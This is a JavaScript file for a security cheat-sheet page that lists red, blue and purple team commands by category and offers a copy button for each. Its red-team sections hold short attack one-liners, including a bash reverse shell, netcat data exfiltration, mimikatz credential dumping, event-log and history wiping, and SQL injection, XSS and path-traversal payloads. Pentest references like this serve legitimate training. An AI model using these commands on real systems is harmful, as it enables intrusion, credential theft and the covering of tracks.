const DB={"osint": [{"title": "WHOIS Domain", "cmd": "whois example.com", "team": "BLUE", "desc": "Query domain registration"}, {"title": "DNS NSLOOKUP", "cmd": "nslookup domain", "team": "BLUE", "desc": "DNS resolution"}, {"title": "DIG Query", "cmd": "dig domain +short", "team": "BLUE", "desc": "Advanced DNS query"}, {"title": "Zone Transfer", "cmd": "dig axfr @ns domain", "team": "RED", "desc": "DNS zone transfer"}, {"title": "Google Dorking", "cmd": "site:domain filetype:pdf", "team": "BLUE", "desc": "Find documents"}, {"title": "LinkedIn Search", "cmd": "site:linkedin.com company", "team": "PURPLE", "desc": "Employee discovery"}, {"title": "GitHub Secrets", "cmd": "site:github.com password", "team": "RED", "desc": "Exposed secrets"}, {"title": "SSL Certificate", "cmd": "openssl s_client -connect host:443", "team": "BLUE", "desc": "SSL info"}, {"title": "Subdomain Enum", "cmd": "dig *.domain", "team": "PURPLE", "desc": "Subdomain discovery"}, {"title": "Wayback Machine", "cmd": "archive.org", "team": "BLUE", "desc": "Historical snapshots"}], "windows_red": [{"title": "Privs Check", "cmd": "whoami /priv", "team": "RED", "desc": "Check user privileges"}, {"title": "RUN Key Persist", "cmd": "reg ADD HKCU\\\\...\\\\Run /V name", "team": "RED", "desc": "RUN key persistence"}, {"title": "Schtask Persist", "cmd": "schtasks /Create /F /SC DAILY", "team": "RED", "desc": "Scheduled task"}, {"title": "Service Persist", "cmd": "sc create Service binpath=", "team": "RED", "desc": "Service persistence"}, {"title": "Token Impersonate", "cmd": "steal_token PID", "team": "RED", "desc": "Token theft"}, {"title": "Priv Escalate", "cmd": "getsystem", "team": "RED", "desc": "Escalate to SYSTEM"}, {"title": "UAC Bypass", "cmd": "fodhelper.exe", "team": "RED", "desc": "UAC bypass"}, {"title": "PSH Reverse", "cmd": "$client=New-Object TcpClient('IP',PORT)", "team": "RED", "desc": "PowerShell shell"}, {"title": "Clear Logs", "cmd": "wevtutil cl Security", "team": "RED", "desc": "Clear event logs"}, {"title": "Cred Dump", "cmd": "sekurlsa::logonpasswords", "team": "RED", "desc": "Dump credentials"}], "windows_blue": [{"title": "OS Version", "cmd": "ver", "team": "BLUE", "desc": "Windows version"}, {"title": "System Info", "cmd": "systeminfo", "team": "BLUE", "desc": "Full system info"}, {"title": "Patches", "cmd": "wmic qfe list", "team": "BLUE", "desc": "Installed patches"}, {"title": "Users", "cmd": "net user", "team": "BLUE", "desc": "Local users"}, {"title": "Admins", "cmd": "net localgroup Administrators", "team": "BLUE", "desc": "Admin accounts"}, {"title": "Processes", "cmd": "tasklist /v", "team": "BLUE", "desc": "Running processes"}, {"title": "Network", "cmd": "ipconfig /all", "team": "BLUE", "desc": "Network config"}, {"title": "Connections", "cmd": "netstat -ano", "team": "BLUE", "desc": "Active connections"}, {"title": "Services", "cmd": "sc query", "team": "BLUE", "desc": "Running services"}, {"title": "Firewall", "cmd": "netsh advfirewall show allprofiles", "team": "BLUE", "desc": "Firewall status"}], "windows_purple": [{"title": "Detect Lateral", "cmd": "Get-NetLogonDomainTrustRelationship", "team": "PURPLE", "desc": "Domain trusts"}, {"title": "Monitor Exec", "cmd": "Get-EventLog Security -InstanceId 4688", "team": "PURPLE", "desc": "Process execution"}, {"title": "Find Persist", "cmd": "Get-ItemProperty HKCU:\\\\Software\\\\Run", "team": "PURPLE", "desc": "Persistence check"}, {"title": "Hunt Shells", "cmd": "Get-Process | grep cmd,powershell", "team": "PURPLE", "desc": "Shell detection"}, {"title": "DNS Cache", "cmd": "Get-DnsClientCache", "team": "PURPLE", "desc": "DNS analysis"}], "linux_red": [{"title": "SUID Bins", "cmd": "find / -perm -4000 -type f", "team": "RED", "desc": "SUID escalation"}, {"title": "Sudo Abuse", "cmd": "sudo -l", "team": "RED", "desc": "Sudo privileges"}, {"title": "Kernel Exp", "cmd": "searchsploit kernel $(uname -r)", "team": "RED", "desc": "Kernel exploit"}, {"title": "History Clear", "cmd": "cat /dev/null > ~/.bash_history", "team": "RED", "desc": "Clear bash history"}, {"title": "SSH Key", "cmd": "cat ~/.ssh/id_rsa", "team": "RED", "desc": "SSH key access"}, {"title": "Rev Shell Bash", "cmd": "bash -i >& /dev/tcp/IP/PORT 0>&1", "team": "RED", "desc": "Bash reverse shell"}, {"title": "Rev Shell Python", "cmd": "python -c 'import socket...'", "team": "RED", "desc": "Python shell"}, {"title": "Data Exfil", "cmd": "tar czf - /data | nc IP 4444", "team": "RED", "desc": "Data exfiltration"}, {"title": "Cron Persist", "cmd": "crontab -e", "team": "RED", "desc": "Cron persistence"}, {"title": "Capability Abuse", "cmd": "getcap -r /", "team": "RED", "desc": "Capability abuse"}], "linux_blue": [{"title": "OS Info", "cmd": "uname -a", "team": "BLUE", "desc": "System information"}, {"title": "Users", "cmd": "cat /etc/passwd", "team": "BLUE", "desc": "User listing"}, {"title": "Groups", "cmd": "cat /etc/group", "team": "BLUE", "desc": "Group listing"}, {"title": "Processes", "cmd": "ps aux", "team": "BLUE", "desc": "Running processes"}, {"title": "Network", "cmd": "ifconfig -a", "team": "BLUE", "desc": "Network config"}, {"title": "Ports", "cmd": "ss -tulpn", "team": "BLUE", "desc": "Listening ports"}, {"title": "Services", "cmd": "systemctl list-units --type=service", "team": "BLUE", "desc": "Services"}, {"title": "Permissions", "cmd": "ls -la /", "team": "BLUE", "desc": "Permission check"}, {"title": "Firewall", "cmd": "ufw status", "team": "BLUE", "desc": "Firewall status"}, {"title": "Logs", "cmd": "tail -f /var/log/auth.log", "team": "BLUE", "desc": "Log monitoring"}], "linux_purple": [{"title": "Audit Config", "cmd": "auditctl -l", "team": "PURPLE", "desc": "Audit rules"}, {"title": "Failed Login", "cmd": "grep 'Failed' /var/log/auth.log", "team": "PURPLE", "desc": "Failed logins"}, {"title": "File Monitor", "cmd": "tripwire --check", "team": "PURPLE", "desc": "File integrity"}, {"title": "Traffic Cap", "cmd": "tcpdump -i eth0", "team": "PURPLE", "desc": "Network traffic"}, {"title": "Process Audit", "cmd": "auditctl -w /usr/bin", "team": "PURPLE", "desc": "Process monitoring"}], "network": [{"title": "Ping", "cmd": "ping -c 4 IP", "team": "BLUE", "desc": "Host reachability"}, {"title": "Ping Sweep", "cmd": "for i in {1..254}; do ping...", "team": "BLUE", "desc": "Network discovery"}, {"title": "Nmap Basic", "cmd": "nmap -sn IP/24", "team": "BLUE", "desc": "Host discovery"}, {"title": "Nmap Full", "cmd": "nmap -A -sV -p- IP", "team": "BLUE", "desc": "Full scan"}, {"title": "Nmap OS", "cmd": "nmap -O IP", "team": "BLUE", "desc": "OS detection"}, {"title": "UDP Scan", "cmd": "nmap -sU IP", "team": "BLUE", "desc": "UDP ports"}, {"title": "ARP Scan", "cmd": "arp-scan -l", "team": "BLUE", "desc": "ARP discovery"}, {"title": "Zone Transfer", "cmd": "dig axfr @ns domain", "team": "RED", "desc": "Zone transfer"}, {"title": "Pcap Capture", "cmd": "tcpdump -w file.pcap", "team": "PURPLE", "desc": "Capture packets"}, {"title": "Wireshark", "cmd": "wireshark -i eth0", "team": "PURPLE", "desc": "Packet analysis"}], "web": [{"title": "SQLi Basic", "cmd": "' OR '1'='1' -- -", "team": "RED", "desc": "SQL injection"}, {"title": "XSS Script", "cmd": "\"><script>alert('xss')", "team": "RED", "desc": "XSS attack"}, {"title": "Cmd Inject", "cmd": "; ls -la;", "team": "RED", "desc": "Command injection"}, {"title": "Path Traverse", "cmd": "../../../../etc/passwd", "team": "RED", "desc": "File access"}, {"title": "Upload RCE", "cmd": "shell.php", "team": "RED", "desc": "File upload RCE"}, {"title": "SQLMap", "cmd": "sqlmap -u 'url' --dbs", "team": "RED", "desc": "Automated SQLi"}, {"title": "Nikto Scan", "cmd": "nikto -h site.com", "team": "BLUE", "desc": "Web scan"}, {"title": "Burp Suite", "cmd": "burpsuite", "team": "PURPLE", "desc": "Web proxy"}, {"title": "Curl Headers", "cmd": "curl -I site.com", "team": "BLUE", "desc": "Header check"}, {"title": "JWT Decode", "cmd": "jwt.io", "team": "RED", "desc": "JWT analysis"}], "exploitation": [{"title": "Metasploit", "cmd": "msfconsole", "team": "RED", "desc": "MSF framework"}, {"title": "Payload Gen", "cmd": "msfvenom -p shell", "team": "RED", "desc": "Payload creation"}, {"title": "Hashcat", "cmd": "hashcat -m 1000 hashes", "team": "RED", "desc": "GPU cracking"}, {"title": "John", "cmd": "john hashes.txt", "team": "RED", "desc": "CPU cracking"}, {"title": "Hydra", "cmd": "hydra -l user -P pass", "team": "RED", "desc": "Brute force"}, {"title": "Searchsploit", "cmd": "searchsploit keyword", "team": "BLUE", "desc": "Exploit search"}, {"title": "Exploit DB", "cmd": "exploitdb.com", "team": "BLUE", "desc": "Exploit database"}, {"title": "CVE Search", "cmd": "cvedetails.com", "team": "BLUE", "desc": "CVE lookup"}, {"title": "Metasploit Exp", "cmd": "use exploit/...", "team": "RED", "desc": "Load exploit"}, {"title": "Reverse Eng", "cmd": "objdump -d binary", "team": "RED", "desc": "Binary analysis"}], "defense": [{"title": "Snort", "cmd": "snort -c rules.conf", "team": "BLUE", "desc": "IDS detection"}, {"title": "Suricata", "cmd": "suricata -c rules.yaml", "team": "BLUE", "desc": "Network IDS"}, {"title": "OSSEC", "cmd": "ossec-control start", "team": "BLUE", "desc": "Host IDS"}, {"title": "Zeek", "cmd": "zeek -r file.pcap", "team": "BLUE", "desc": "Network monitoring"}, {"title": "Fail2Ban", "cmd": "fail2ban-client status", "team": "BLUE", "desc": "Attack prevention"}, {"title": "SELinux", "cmd": "semanage user -l", "team": "BLUE", "desc": "Security policy"}, {"title": "AppArmor", "cmd": "apparmor_status", "team": "BLUE", "desc": "Access control"}, {"title": "UFW", "cmd": "ufw enable", "team": "BLUE", "desc": "UFW firewall"}, {"title": "IPTables", "cmd": "iptables -L", "team": "BLUE", "desc": "Netfilter rules"}, {"title": "AIDE", "cmd": "aide --check", "team": "BLUE", "desc": "File integrity"}]};const SECS=Object.keys(DB);const NAV=document.getElementById('nav');SECS.forEach(s=>{const b=document.createElement('button');b.className='tab-btn';b.textContent=s.replace(/_/g,' ').toUpperCase();b.onclick=e=>{e.preventDefault();e.stopPropagation();showTab(s);};NAV.appendChild(b);});function showTab(s){try{document.querySelectorAll('.section').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active'));const sec=document.getElementById(s);if(sec){sec.classList.add('active');document.querySelector(`[onclick*="showTab('${s}')"]`)?.classList.add('active');const g=document.getElementById('grid-'+s);if(g&&!g.innerHTML)render(s);}}catch(e){console.error(e);}}function render(s){try{const g=document.getElementById('grid-'+s);if(!g)return;let h='';DB[s].forEach(c=>{const t=c.team.toLowerCase();const tc=t==='red'?'red':t==='purple'?'purple':'blue';h+=`<div class="card ${tc}"><div class="card-header"><div class="card-title">${c.title}</div><span class="team team-${tc}">${c.team}</span></div><div class="desc">${c.desc}</div><div class="cmd">${c.cmd.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div><button class="copy" onclick="copy('${c.cmd.replace(/'/g,"\\'").replace(/\\/g,'\\\\')}')")>📋 Copy</button></div>`;});g.innerHTML=h;}catch(e){console.error(e);}}function copy(t){try{navigator.clipboard.writeText(t).then(()=>{const toast=document.getElementById('toast');toast.textContent='✅ Copied to clipboard!';toast.classList.add('show');setTimeout(()=>toast.classList.remove('show'),3000);}).catch(()=>{alert('Failed to copy');});}catch(e){alert('Error copying');}}SECS.forEach(s=>{render(s);});